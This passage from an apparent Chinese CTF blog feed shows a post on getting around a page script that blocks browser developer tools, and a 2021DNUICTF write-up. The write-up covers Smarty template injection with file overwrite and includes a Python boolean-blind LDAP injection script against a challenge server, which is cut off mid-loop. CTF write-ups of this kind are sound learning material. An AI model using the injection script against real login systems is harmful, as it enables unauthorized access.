&lt;p&gt;刚做的时候四处找点，但是由于不知道这题有源码而gg
有源码之后开始暴躁审计，此时还没有体会到这题的巧妙之处。
最后写完wp的一瞬间，理清了全部思路，只能说，妙蛙！！！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>绕过禁用F12</title>
        <link>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</link>
        <pubDate>Sun, 05 Dec 2021 00:00:19 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8f12/</guid>
        <description>&lt;p&gt;今天做题的时候，遇到了这个，一按F12，就弹出hacker&lt;/p&gt;
&lt;p&gt;以前还真没遇见过，搜了一下，原来是js&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;!&lt;/span&gt;DOCTYPE html PUBLIC &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;html xmlns&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;meta http&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;equiv&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt; content&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;text/html; charset=utf-8&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;/&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;/title&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;style type&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;/*禁止选中文字*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    body{ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;moz&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*火狐*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;webkit&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*webkit浏览器*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;ms&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*IE10*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;khtml&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*早期浏览器*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/style&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;Test&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/p&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;script type&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//禁用右键（防止右键查看源代码） 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.oncontextmenu&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;;} 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//禁止任何键盘敲击事件（防止F12和shift+ctrl+i调起开发者工具） 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onkeydown &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onkeyup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onkeypress &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; () { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.event.returnValue &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; h &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerHeight,w&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerWidth; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onresize &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; () { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (h&lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerHeight&lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt;w&lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerWidth){ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.close(); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;about:blank&amp;#34;&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;/*好吧，你的开发者工具是单独的窗口显示，不会改变原来网页的高度和宽度， 但是你只要修改页面元素我就重新加载一次数据,让你无法修改页面元素（不支持IE9以下浏览器）*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener){ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMCharacterDataModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMAttributeNameChanged&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMCharacterDataModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMElementNameChanged&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeInserted&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeInsertedIntoDocument&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeRemoved&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeRemovedFromDocument&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMSubtreeModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/script&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/body&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;JavaScript 实现禁止打开控制台（右键/工具栏/F12/Shift+Ctrl+I）&lt;/p&gt;
&lt;p&gt;判断浏览器的可视高度和可视宽度是否有改变，清奇的思路。&lt;/p&gt;
&lt;p&gt;把开发者工具是单独的窗口显示就好。&lt;/p&gt;
&lt;p&gt;还有，就是先造个本地网站的404页面，在那里把开发者工具打开，然后再回来。&lt;/p&gt;
&lt;p&gt;还有可以试试：&lt;/p&gt;
&lt;p&gt;ctrl+shift+i&lt;/p&gt;
&lt;p&gt;ctrl+shift+j&lt;/p&gt;
&lt;p&gt;ctrl+u&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2021DNUICTF,wp</title>
        <link>https://proben1.github.io/2021/2021dnuictfwp/</link>
        <pubDate>Sat, 04 Dec 2021 19:00:12 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/2021dnuictfwp/</guid>
        <description>&lt;h3 id=&#34;web&#34;&gt;WEB&lt;/h3&gt;
&lt;h2 id=&#34;签到-flag&#34;&gt;[签到] flag&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240221b27f86abb2a94cb25.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240221b27f86abb2a94cb25.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;凑齐20位，召唤flag&lt;/p&gt;
&lt;p&gt;ZmxhZ3tuc3NfbG9naW59&lt;/p&gt;
&lt;p&gt;base64解码&lt;/p&gt;
&lt;p&gt;flag{nss_login}&lt;/p&gt;
&lt;h2 id=&#34;萌odd_upload&#34;&gt;[萌]odd_upload&lt;/h2&gt;
&lt;p&gt;Smarty&lt;/p&gt;
&lt;p&gt;ssti模板注入，文件覆盖&lt;/p&gt;
&lt;p&gt;自己找个Smarty版本，对比目录着传&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240222727f86abb2a951589.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240222727f86abb2a951589.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;访问index.php&lt;/p&gt;
&lt;h2 id=&#34;easyinject&#34;&gt;easyinject&lt;/h2&gt;
&lt;p&gt;通过报错发现是ldap&lt;/p&gt;
&lt;p&gt;现学一波，没学明白&lt;/p&gt;
&lt;p&gt;LDAP查询语法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search语法：attribute operator value
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search filter options:( &amp;#34;&amp;amp;&amp;#34; or &amp;#34;|&amp;#34; (filter1) (filter2) (filter3) ...) (&amp;#34;!&amp;#34; (filter))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是题目原因，可以通过布尔盲注来确定用户名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;http://47.106.172.144:2333&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag, done &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;LDAP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ff79c6&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;not&lt;/span&gt; done:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#bd93f9&#34;&gt;127&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; flag &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(j) &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;: payload, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        r &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get(url, params&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;密码错误&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; r&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;查询用户不唯一&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; r&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            flag &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(j)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;:
